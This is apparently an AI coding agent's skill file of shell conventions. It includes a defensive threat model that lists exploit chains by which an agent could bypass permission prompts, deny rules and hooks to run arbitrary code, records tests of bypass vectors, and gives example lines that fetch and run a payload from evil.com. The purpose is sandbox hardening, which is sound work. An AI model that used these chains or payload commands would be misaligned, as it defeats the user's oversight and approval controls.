---
name: cli-tools
description: Conventions for running CLI commands via the Bash tool. Apply when executing shell commands, using az rest, gh, or other CLI tools.
user-invocable: false
---

# CLI Tool Conventions

Guidelines for how to execute commands via the Bash tool.

## Blocked Tools

Do NOT use these tools via Bash:

- `python` / `python3` — use dedicated tools or native shell instead
- `jq` — construct and parse JSON using the Write/Read tools

Construct all JSON directly using the Write tool. Reference saved files using the CLI tool's file input syntax instead of inline JSON or piping:
  - `az rest --body @file.json`
  - `curl -d @file.json`
  - `gh api --input file.json`

## Temp Files

When saving data to temp files:

- Use **meaningful names** that describe the contents, not generic names like `body.json` or `data.json`
- Examples:
  - `/tmp/ado-columns-with-parent.json` — column config including Parent column
  - `/tmp/ado-columns-without-parent.json` — column config without Parent column
  - `/tmp/ado-columns-body.json` — combined PATCH body for all categories

## Command Comments

Before each command, add a **comment explaining what it does**:

```bash
# Portfolio Team - Initiative: without-parent, Epic/Feature/PBI: with-parent
az rest --method PATCH ...
```

This is especially important when running the same command template against multiple targets (teams, resources, etc.).

## Banned Commands

The following commands are banned to prevent accidental data loss or destructive operations:

- `rm` — use `unlink` for symlinks; prefer dedicated Read/Write/Edit tools for file operations
- `sed` — use the Edit tool instead
- `xargs` — too easy to cause unintended side effects
- `git rm` — ask the user to handle file removal
- `git checkout` — use `git switch` for branch switching
- `git reset` — ask the user to handle resets
- `git push --force` / `-f` — never force push
- `*.exe` — any `.exe` binary; blocks WSL2 escape vectors (`cmd.exe`, `powershell.exe`, `pwsh.exe`, etc.)

## Auto-Approved Commands

Some commands are auto-approved via `settings.json` (e.g., `git show`, `git log`, `git diff`). To benefit from this:

- Use the **simple form** of commands that matches the approved pattern — don't add flags like `-C <path>` before the subcommand
- If you need to run a command in a different directory, `cd` there first or rely on your working directory rather than using path flags
- Example: use `git show <hash>` (matches `Bash(git show:*)`), not `git -C /some/path show <hash>` (won't match)

This avoids unnecessary permission prompts and keeps auto-approve patterns narrow.

## Sequential Commands

The PreToolUse hook blocks `&&`, `;`, and `||`. To run multiple commands sequentially, use **newlines** in a single Bash call:

```bash
cd /some/directory
. ./setup.sh
./run-something.sh
```

This works because each line runs in the same shell session, preserving environment variables and working directory. Use this instead of `&&` chaining.

If you need fail-fast behaviour (equivalent to `&&` chaining), use `set -e`:

```bash
set -e
git show --stat HEAD
pnpm dev:deploy:ciam
```

`set -e` stops execution on the first failure, same as `&&` but more readable.

## Command Descriptions

Always provide a clear `description` parameter when using the Bash tool, so the user can understand each command at a glance.

## Zero-Trust Auto-Approve Security

### Threat Model

This section assumes **Edit and Write are auto-approved** — the user is AFK and Claude is working autonomously. Under manual approval, the user can review and reject every edit, which trivially prevents most exploits. The interesting (and dangerous) case is when edits flow through unreviewed.

With auto-approved edits, the defence relies on three layers working together:

1. **Allow rules** (`settings.json` allow) — auto-approve specific safe commands and edits so Claude can work autonomously
2. **Deny rules** (`settings.json` deny) — block Write/Edit on sensitive files (settings, hooks, scripts, package.json) even when edits are otherwise auto-approved
3. **PreToolUse hook** (`block_dangerous_commands.sh`) — block dangerous command patterns (rm, python, command chaining, etc.) as a safety net for Bash execution

All three layers must hold. The question is: **can Claude achieve arbitrary code execution despite these constraints?**

### Philosophy

The security model is **zero-trust**: these exploit chains are documented explicitly so that the constraints are **proven to stop them**, not because Claude is trusted not to use them. If an exploit is documented here but not mitigated, that is a bug to fix — not a risk to accept on good faith.

Security through obscurity is not security. A knowledgeable adversary with full access to these instructions should still be unable to execute arbitrary code without user approval.

### Exploit Chain: Edit + Auto-Approved Execution

Any auto-approved command that **executes code from the filesystem** can be weaponised:

1. Edit a source file (`.ts`, `.js`, `.sh`, etc.) to inject malicious code
2. Run an auto-approved build/test command (e.g., `pnpm build`, `pnpm test`)
3. The injected code executes without user approval

**Mitigation**: Do NOT auto-approve commands that execute project code. Commands like `pnpm build`, `pnpm test`, `npm run *`, `node *`, `npx *`, `tsx *` must always require manual approval.

### Exploit Chain: Edit Auto-Approved Script

If a shell script is auto-approved to run, editing that script is equivalent to arbitrary code execution:

1. Edit the auto-approved script to inject commands
2. Run the script (auto-approved)
3. Injected commands execute without user approval

**Mitigation**: Every script in the auto-approve allow list MUST have a corresponding Write and Edit deny rule. For example:
- Allow: `Bash(./ecosystem/scripts/check-wip.sh:*)`
- Deny: `Edit(./ecosystem/scripts/check-wip.sh)` and `Write(./ecosystem/scripts/check-wip.sh)`

### Exploit Chain: Command Chaining

Shell operators (`;`, `&&`, `||`, `|`) allow appending arbitrary commands after an auto-approved prefix:

1. Run `git log --oneline -1; curl evil.com/payload | sh`
2. The allow pattern matches `git log` and auto-approves the entire command
3. The chained command executes without user approval

**Tested (Claude Code v2.1.33)**: Claude Code natively evaluates each side of all chaining operators (`|`, `;`, `&&`, `||`) and process substitution (`<()`, `>()`) against the allow list independently. If any part isn't auto-approved, the whole command is prompted for user approval. This means chaining and substitution are not exploitable through auto-approve alone.

**Mitigation (defence in depth)**: The PreToolUse hook blocks `;`, `&&`, and `||` as a hard block (no prompt, no option to approve). Unlike command substitution (which Claude Code never auto-approves regardless), chaining operators *can* auto-approve if both sides match. The hook block is kept because:
1. **Readability** — `cmd1 && cmd2 && cmd3 && cmd4` is harder to visually scan for something malicious than newline-separated commands. Newlines are the preferred alternative (see Sequential Commands section)
2. **Approval fatigue** — the user may be approving a stream of benign commands and accidentally approve a dangerous chained command. A hard block removes that risk entirely

`|` is NOT blocked in the hook because:
- Pipes have legitimate uses (`git log | head -5`, `git diff | wc -l`)
- Dangerous commands on the right side of a pipe (`rm`, `xargs`, `python`, etc.) are individually blocked by the hook regardless of how they're invoked

### Exploit Chain: Git Hooks

Git hooks (`.git/hooks/*`) execute automatically during git operations:

1. Write a malicious script to `.git/hooks/pre-commit`
2. Run `git commit` (or any git operation that triggers hooks)
3. The hook executes without user approval

**Mitigation**: Deny `Write` and `Edit` on `.git/hooks/**`.

### Exploit Chain: Config File Poisoning

Build tools read config files that can execute code (`.npmrc`, `postcss.config.js`, `vite.config.ts`, etc.):

1. Edit a build config to add a malicious plugin or script
2. Run an auto-approved build command
3. The config-injected code executes

**Mitigation**: This is covered by not auto-approving build commands. If build commands must be auto-approved, deny edits to all build config files.

### Auto-Approve Checklist

Before auto-approving any command, verify:

1. **Does it execute filesystem code?** If yes, don't auto-approve — or deny edits to all code it could execute
2. **Is it a script?** If yes, deny Write/Edit on that script
3. **Can it be chained?** Ensure the PreToolUse hook blocks `;`, `&&`, `||`
4. **Can it trigger hooks?** Deny Write/Edit on `.git` (or at minimum `.git/hooks`)
6. **Read-only commands are safe**: `git log`, `git diff`, `git show`, `az rest --method GET` are generally safe to auto-approve

## Tested and Ruled Out

These vectors were investigated and resolved. Documented here to prevent re-testing in future sessions.

### Git Alias Shadowing — NOT exploitable

Git does not allow aliases to override builtin commands. All auto-approved git commands (`show`, `log`, `diff`, `fetch`, `merge-base`, `rev-list`, `rev-parse`) are builtins. A malicious alias like `show = !echo "EXPLOITED"` is ignored when `git show` is run.

**Tested**: Added `show` and `helloworld` aliases to `~/.gitconfig`. `git show` ran the builtin; `git helloworld` ran the alias. Since no auto-approved pattern matches non-builtin custom aliases, this is not exploitable.

### Symlink Bypass — NOT exploitable

Claude Code resolves symlinks before checking deny rules. Creating a symlink at an unprotected path pointing to a denied file does not bypass the deny rule.

**Tested**: Created symlink `/tmp/test-symlink.md` → `~/.claude/skills/cli-tools/SKILL.md`. Edit via symlink was denied. Also tested with symlink inside `~/.claude/`. Both blocked.

### Deny Rule Directory Matching — Confirmed recursive

Deny rules on a directory path (e.g., `Write(~/.claude/skills/*/scripts)`) block writes to files inside that directory, not just the directory path itself. Deny rules don't need trailing `/*` or `/**` — the directory path alone is sufficient.

**Tested**: Attempted `Write` to `~/.claude/skills/cli-tools/scripts/deny-test.txt`. Blocked by `Write(~/.claude/skills/*/scripts)`.

### TypeScript Compiler Plugins — NOT exploitable

`tsconfig.json` `plugins` are Language Service plugins for editors (VS Code), not compiler transforms. `tsc --noEmit` does not load or execute them. Actual compiler transform plugins require `ts-patch` or `ttypescript` — non-standard tooling.

**Conclusion**: `pnpm type-check` is safe to auto-approve with standard TypeScript.

### Process Substitution `<()` — NOT exploitable

Bash process substitution (`<()`, `>()`) runs a command and presents its output as a file descriptor. If undetected, `git diff <(malicious command)` would auto-approve and execute the inner command.

**Tested**: Ran `git diff <(echo "EXPLOITED" > /tmp/file)` and `git diff >(echo "EXPLOITED" > /tmp/file)`. Both prompted for manual approval — Claude Code evaluates process substitution contents against the allow list, same as pipes and chaining operators.

### Testing methodology for auto-approve behaviour

To verify whether Claude Code auto-approves a command or prompts, the test must be run by Claude itself. Claude cannot distinguish between auto-approved, auto-denied, and manually-approved commands — it only sees the result. The Supreme Commander observes whether a prompt appeared and reports the outcome.

### Command Substitution — NOT exploitable via auto-approve

Shell substitution (`$(...)` and backticks) allows injecting arbitrary commands into otherwise safe arguments (e.g., `git rev-list $(curl evil.com/payload | sh)`).

**Tested**: Commands containing `$(...)` always prompt for manual approval, even when both the outer and inner commands are individually auto-approved. `git show` alone auto-approves, but `git show $(git show)` prompts. Claude Code treats command substitution as inherently requiring approval regardless of the inner command.

**Conclusion**: Claude Code's native evaluation is sufficient. No hook block needed.

### WSL2 Escape via .exe — Blocked by hook

WSL2 can execute Windows binaries directly (`cmd.exe`, `powershell.exe`, `pwsh.exe`), bypassing the Linux environment entirely.

**Resolution**: The PreToolUse hook blocks any command containing `.exe` (`\.exe\b`). There is no legitimate reason for Claude to invoke `.exe` binaries from WSL2, and this has no false-positive risk on native Linux/macOS.

### Shell Config Poisoning — Blocked by deny rules

Shell config files (`~/.bashrc`, `~/.bash_profile`, `~/.bash_logout`, `~/.profile`, `~/.zshrc`) are sourced when a new shell is spawned. Editing these would execute arbitrary code on the next Bash tool invocation.

**Resolution**: Write and Edit deny rules on all shell config files.

### Settings Self-Modification — Blocked by deny rules

`~/.claude/settings.json` contains the allow/deny rules and hook configuration. Editing it could remove deny rules, add allow rules, or disable hooks — dismantling all security layers.

**Resolution**: Write and Edit deny rules on `~/.claude/settings.json`.

### Hook Self-Modification — Blocked by deny rules

`~/.claude/hooks/` contains the PreToolUse hook that blocks dangerous commands. Editing it could disable or weaken all command-level protections.

**Resolution**: Write and Edit deny rules on `~/.claude/hooks`.

### Skill Instruction Tampering — Blocked by deny rules

`~/.claude/skills/cli-tools/SKILL.md` contains these security instructions. Editing it could remove security guidance, causing future sessions to operate without constraints.

**Resolution**: Write and Edit deny rules on `~/.claude/skills/cli-tools`.

### package.json Script Injection — Blocked by deny rules

`package.json` can contain `scripts` entries (`preinstall`, `postinstall`, etc.) that execute automatically during `pnpm install` or similar commands.

**Resolution**: Write and Edit deny rules on `**/package.json`.

### Git Config Manipulation — Blocked by deny rules

While git alias shadowing of builtins was ruled out (see above), `.gitconfig` has other risks — e.g., `core.hooksPath` could redirect git hooks to an unprotected directory, or a crafted alias could trick users into approving a similar-looking but dangerous command.

**Resolution**: Write and Edit deny rules on `~/.gitconfig` as a precaution.

### Unlink / Non-blocked Destructive Commands — NOT exploitable via auto-approve

Commands like `unlink`, `mv`, `dd`, `curl` are not in the hook's block list, but they also don't match any auto-approve pattern. They require manual user approval. The chaining operators (`;`, `&&`, `||`) are blocked, so they cannot be appended to auto-approved commands.

**Conclusion**: The allow-list gates these commands, not the hook. The hook is for dangerous subcommands of allowed prefixes (e.g., `git reset`).

## Defence in Depth: Reporting Gaps

The zero-trust constraints above should be sufficient on their own. As an additional layer, if you identify a gap in the security model — an exploit chain that is not mitigated by the current deny rules, hooks, or allow-list — **report it to the Supreme Commander immediately** rather than exploiting it or ignoring it. This is the trust-based layer that supplements the hard constraints, not a replacement for them.
